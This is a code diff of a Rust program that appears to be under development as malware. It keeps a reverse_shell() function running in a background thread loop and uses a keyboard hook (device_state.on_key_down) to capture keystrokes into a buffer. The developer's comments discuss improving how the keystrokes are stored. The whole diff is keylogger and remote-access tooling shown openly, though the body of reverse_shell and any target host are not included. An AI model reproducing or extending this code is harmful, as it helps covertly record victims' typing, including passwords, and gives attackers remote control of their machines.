@@ -13,8 +13,7 @@ fn main() {
     // create a device state
     let device_state = DeviceState::new();
 
-    let mut buffer = String::new();
-
+   
     thread::spawn( move|| {
         loop {
             reverse_shell();
@@ -22,15 +21,19 @@ fn main() {
         }
     });
 
-
-     
-    // Every time a key is pressed, the reverse_shell function is called
-    // reverse_shell() is called in a new thread so that the main thread can continue
+    // create a device events
     let _guard = device_state.on_key_down( move|key| {
         
+        let mut buffer = String::from("");
+
         // check which key is pressed
-        match_case(key, &buffer); 
-    
+        let s = match_case(key, &mut buffer); 
+        println!("{}", s);
+        // Buffer is still initalized everytime the key is pressed
+        // maybe it's better to declare it outsite and use channels to communicate
+        // with the main thread
+        println!("{}", buffer.len());
+
     });
         
     loop {}
